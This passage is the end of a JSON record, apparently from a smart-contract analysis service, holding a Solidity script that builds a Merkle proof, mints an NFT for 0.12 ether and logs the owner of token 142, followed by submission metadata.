merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T07:09:55.422Z","completed_at":"2025-08-28T07:11:52.205Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":null,"public_description":null,"tags":[],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false}]